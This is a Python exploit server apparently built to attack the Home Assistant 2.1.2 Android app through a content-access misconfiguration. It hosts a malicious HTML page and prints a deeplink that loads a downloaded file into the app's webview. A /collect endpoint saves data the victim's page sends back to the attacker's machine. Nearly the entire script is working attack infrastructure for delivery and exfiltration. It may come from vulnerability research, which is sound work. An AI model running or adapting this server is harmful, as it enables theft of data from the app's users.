#!/usr/bin/env python3
"""Home Assistant 2.1.2 - Content Access Misconfiguration 攻击服务�?""
import os, time, socket, urllib.parse as up
from http.server import HTTPServer, BaseHTTPRequestHandler

OUT_DIR = "received"
EXP_DIR = "exp"
os.makedirs(OUT_DIR, exist_ok=True)

def _get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close(); return ip
    except: return "127.0.0.1"

LOCAL_IP = _get_local_ip()
print(f"[*] IP: {LOCAL_IP}")
print(f"[*] 攻击页面: http://{LOCAL_IP}:8000/exp/2.1.2")
print(f"[*] Deeplink: homeassistant://webview?url=file:///sdcard/Download/exploit.html")

class ExpHandler(BaseHTTPRequestHandler):
    def log_message(self, f, *a): print(f"[{time.strftime('%H:%M:%S')}] {a[0]}")
    def do_GET(self):
        p = up.urlparse(self.path)
        if p.path == "/collect":
            d = up.parse_qs(p.query).get("d",[""])[0]
            if d:
                ts = str(int(time.time()*1000))
                with open(os.path.join(OUT_DIR, f"collected_{ts}.txt"),"w",encoding="utf-8") as f:
                    f.write(up.unquote(d))
                print(f"[+] 数据已回�?-> collected_{ts}.txt")
            self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers(); self.wfile.write(b"ok")
            return
        if p.path == "/exp/2.1.2" or p.path == "/malicious.html":
            hp = os.path.join(EXP_DIR, "2.1.2.html")
            if os.path.exists(hp):
                with open(hp,"r",encoding="utf-8") as f:
                    c = f.read().replace("{{LOCAL_IP}}", LOCAL_IP)
                self.send_response(200); self.send_header("Content-Type","text/html; charset=utf-8"); self.end_headers(); self.wfile.write(c.encode())
            return
        self.send_response(200); self.send_header("Content-Type","text/html"); self.end_headers()
        self.wfile.write(f"<h2>2.1.2 Exploit Server</h2><p>Step1: Download malicious HTML via <a href='/exp/2.1.2'>/exp/2.1.2</a></p><p>Step2: Load via deeplink: <code>homeassistant://webview?url=file:///sdcard/Download/exploit.html</code></p>".encode())

if __name__ == "__main__":
    HTTPServer(("0.0.0.0", 8000), ExpHandler).serve_forever()
